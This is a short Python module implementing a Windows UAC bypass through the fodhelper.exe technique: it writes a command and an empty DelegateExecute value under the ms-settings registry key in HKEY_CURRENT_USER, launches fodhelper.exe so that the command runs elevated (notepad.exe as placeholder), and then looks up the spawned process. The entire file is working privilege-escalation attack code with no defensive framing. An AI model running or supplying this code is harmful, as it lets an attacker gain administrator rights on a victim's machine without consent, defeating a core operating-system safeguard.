import ctypes
import winreg
import os
import psutil

class uac_bypass():

    def __init__(self):
        self.CMD                   = r"C:\Windows\System32\notepad.exe"
        self.REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
        self.DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
        self.FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
    def is_running_as_admin(self):
        '''
        Checks if the script is running with administrative privileges.
        Returns True if is running as admin, False otherwise.
        '''    
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
        
    def create_reg_key(self,key, value):
        '''
        Creates a reg key
        '''
        try:        
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, winreg.KEY_WRITE)                
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
            winreg.CloseKey(registry_key)
        except WindowsError:        
            raise

    def bypass_uac(self,cmd):
        '''
        Tries to bypass the UAC
        '''
        try:
            self.create_reg_key(self.DELEGATE_EXEC_REG_KEY, '')
            self.create_reg_key(None, cmd)    
        except WindowsError:
            raise

    def execute(self):        
        if not self.is_running_as_admin():
            try:                
                
                self.bypass_uac(self.CMD)                
                os.system(self.FOD_HELPER)
                for proc in psutil.process_iter():
                    if proc.name().endswith("notepad.exe"):
                        notePad_pid = proc.pid                              
            except WindowsError:
                return False
        else:
            return notePad_pid
    
        return notePad_pid